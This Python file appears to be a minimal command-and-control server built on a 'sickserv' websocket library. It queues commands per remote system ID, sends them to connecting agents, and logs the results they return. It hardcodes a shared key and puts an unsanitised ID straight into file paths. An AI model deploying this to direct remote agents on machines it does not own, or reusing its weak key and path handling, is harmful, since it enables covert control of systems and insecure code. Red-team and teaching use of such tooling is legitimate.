from sickserv import server_ws, set_init_key
from sickserv.server_ws import response

set_init_key('yellow-submarine')

@server_ws.app.websocket('/init/<sysid>')
async def init(request, ws, sysid):
    await ws.recv()
    with open('{s}-tasking.txt'.format(s=sysid), 'a') as f:
        pass
    with open('{s}-results.txt'.format(s=sysid), 'a') as f:
        pass

@server_ws.app.websocket('/tasking/<sysid>')
async def tasking(request, ws, sysid):
    while True:
        await ws.recv()
        with open('{s}-tasking.txt'.format(s=sysid), 'rb') as f:
            commands = f.read().splitlines()
            if commands:
                for command in commands:
                    return_payload = server_ws.process_payload(
                        sysid, {'command': command}
                    )
                    await ws.send(return_payload)
                with open('{s}-tasking.txt'.format(s=sysid), 'w') as f:
                    pass

@server_ws.app.websocket('/results/<sysid>')
async def results(request, ws, sysid):
    while True:
        data = await ws.recv()
        payload = server_ws.unprocess_payload(sysid, data)
        with open('{s}-results.txt'.format(s=sysid), 'a') as f:
            f.write(payload['results'] + '\n')

server_ws.run(port=1337)
